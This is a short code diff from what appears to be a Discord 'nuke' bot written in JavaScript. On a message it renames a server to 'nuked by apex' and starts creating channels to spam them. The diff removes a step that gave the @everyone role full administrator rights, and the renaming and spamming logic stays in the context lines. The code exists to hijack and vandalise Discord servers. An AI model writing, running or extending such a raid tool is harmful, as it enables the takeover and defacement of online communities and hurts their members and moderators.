@@ -43,10 +43,6 @@ client.on('messageCreate', async (message) => {
       // Rename server
       await message.guild.setName('nuked by apex');
 
-      // Update @everyone role permissions
-      const everyoneRole = message.guild.roles.everyone;
-      await everyoneRole.setPermissions(['ADMINISTRATOR']);
-
       // Function to create a new channel and start spamming
       const createAndSpamChannel = async () => {
         const channel = await message.guild.channels.create({
